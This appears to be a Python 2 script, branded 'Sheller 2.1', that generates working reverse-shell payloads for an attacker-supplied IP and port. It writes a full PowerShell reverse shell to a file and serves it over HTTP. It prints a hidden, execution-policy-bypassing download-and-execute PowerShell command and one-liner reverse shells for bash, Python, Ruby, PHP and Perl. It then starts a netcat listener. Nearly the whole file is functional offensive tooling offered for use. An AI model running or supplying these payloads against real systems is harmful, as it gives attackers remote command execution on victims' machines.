import os
import time
import subprocess

def banner():
	banner = '''
 ____  _          _ _               ____    _ 
/ ___|| |__   ___| | | ___ _ __    |___ \  / |
\___ \| '_ \ / _ \ | |/ _ \ '__|____ __) | | |
 ___) | | | |  __/ | |  __/ | |_____/ __/ _| |
|____/|_| |_|\___|_|_|\___|_|      |_____(_)_|
============================================================
  By - Suraj Aggarwal ( M4TRIX_H4CK3R )\n
	'''
	print banner
	return 0

banner()

def listener():
	cmd = raw_input('\033[1;33m[?]\033[1;m Want to Start Listener? ( y / n ) : ')
	if cmd == 'y':
		print '\033[1;32m[+]\033[1;m Starting Listener'
		time.sleep(1)
		os.system('nc -vlp {}'.format(port))
	return 0

def win_psh():
	print '\033[1;32m[+]\033[1;m Windows PowerShell OS Selected'
	time.sleep(1)
	print '\033[1;32m[+]\033[1;m Generating shellscript..!!'
	time.sleep(2)
	code = '''$socket = new-object System.Net.Sockets.TcpClient('[SHELLERIP]', [SHELLERPORT]);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do
{
	$writer.Flush();
	$read = $null;
	$res = ""
	while($stream.DataAvailable -or $read -eq $null) {
		$read = $stream.Read($buffer, 0, 1024)
	}
	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
	if(!$out.equals("exit")){
		$args = "";
		if($out.IndexOf(' ') -gt -1){
			$args = $out.substring($out.IndexOf(' ')+1);
			$out = $out.substring(0,$out.IndexOf(' '));
			if($args.split(' ').length -gt 1){
                $pinfo = New-Object System.Diagnostics.ProcessStartInfo
                $pinfo.FileName = "cmd.exe"
                $pinfo.RedirectStandardError = $true
                $pinfo.RedirectStandardOutput = $true
                $pinfo.UseShellExecute = $false
                $pinfo.Arguments = "/c $out $args"
                $p = New-Object System.Diagnostics.Process
                $p.StartInfo = $pinfo
                $p.Start() | Out-Null
                $p.WaitForExit()
                $stdout = $p.StandardOutput.ReadToEnd()
                $stderr = $p.StandardError.ReadToEnd()
                if ($p.ExitCode -ne 0) {
                    $res = $stderr
                } else {
                    $res = $stdout
                }
			}
			else{
				$res = (&"$out" "$args") | out-string;
			}
		}
		else{
			$res = (&"$out") | out-string;
		}
		if($res -ne $null){
        $writer.WriteLine($res)
    }
	}
}While (!$out.equals("exit"))
$writer.close();
$socket.close();
$stream.Dispose()'''
	code = code.replace('[SHELLERIP]', ip)
	code = code.replace('[SHELLERPORT]', port)
	print '\033[1;32m[+]\033[1;m Generation Done..!!'
	f = open(os.getcwd() + '/sheller.ps1', 'w+')
	f.write(code)
	f.close()
	time.sleep(1)
	print '\033[1;32m[+]\033[1;m Stored at location : {}/sheller.ps1'.format(os.getcwd())
	time.sleep(1)
	print '\033[1;32m[+]\033[1;m Starting Server'
	cmd = subprocess.Popen(['python', '-m', 'SimpleHTTPServer', '10000'], stdout=subprocess.PIPE)
	print '\033[1;32m[+]\033[1;m Server Started'
	print '\033[1;32m[+]\033[1;m Payload:'
	print "powershell -W Hidden -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://{}:10000/sheller.ps1')".format(ip)
	return 0

def unix():
	print '\033[1;32m[+]\033[1;m Unix OS Selected'
	time.sleep(1)
	print '\033[1;32m[+]\033[1;m Payload:'
	code = 'bash -i >& /dev/tcp/{}/{} 0>&1'.format(ip, port)
	print code
	return 0

def python_linux():
	print '\033[1;32m[+]\033[1;m Python Linux OS Selected'
	time.sleep(1)
	print '\033[1;32m[+]\033[1;m Payload:'
	code = '''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'''.format(ip,port)
	print code + "'"
	return 0

def ruby():
	print '\033[1;32m[+]\033[1;m Ruby OS Selected'
	time.sleep(1)
	print '\033[1;32m[+]\033[1;m Payload:'
	code = '''ruby -rsocket -e'f=TCPSocket.open("{}",{}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'''.format(ip, port)
	print code + "'"
	return 0

def php():
	print '\033[1;32m[+]\033[1;m Php OS Selected'
	time.sleep(1)
	print '\033[1;32m[+]\033[1;m Payload:'
	code = '''php -r '$sock=fsockopen("{}",{});exec("/bin/sh -i <&3 >&3 2>&3");'''.format(ip,port)
	print code + "'"
	return 0

def perl():
	print '\033[1;32m[+]\033[1;m Perl OS Selected'
	time.sleep(1)
	print '\033[1;32m[+]\033[1;m Payload:'
	code = '''perl -e 'use Socket;$i="[IP]";$p=[PORT];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'''
	code = code.replace('[IP]', ip)
	code = code.replace('[PORT]', port)
	print code + "'"
	return 0

def osd():
	os = '''
Select Operating System
========================

 1) Windows PowerShell (PSH)
 2) Unix/Linux Bash
 3) Python Linux
 4) Ruby
 5) PHP
 6) Perl
	'''
	print os
	os_sel = raw_input('==> ')
	os_sel = int(os_sel)
	print '\n'
	if os_sel == 1:
		win_psh()
		listener()
	elif os_sel == 2:
		unix()
		listener()
	elif os_sel == 3:
		python_linux()
		listener()
	elif os_sel == 4:
		ruby()
		listener()
	elif os_sel == 5:
		php()
		listener()
	elif os_sel == 6:
		perl()
		listener()
	else:
		print '\033[1;31m[-]\033[1;m Select a valid OS'
	return 0

def main():
	global ip
	global port
	ip = raw_input('\033[1;33m[?]\033[1;m Enter IP of Listener : ')
	port = raw_input('\033[1;33m[?]\033[1;m Enter PORT of Listener : ')
	osd()
	return 0

try:
	main()
except KeyboardInterrupt:
	print('\n\n\033[1;31m[-]\033[1;m Exiting..!!')
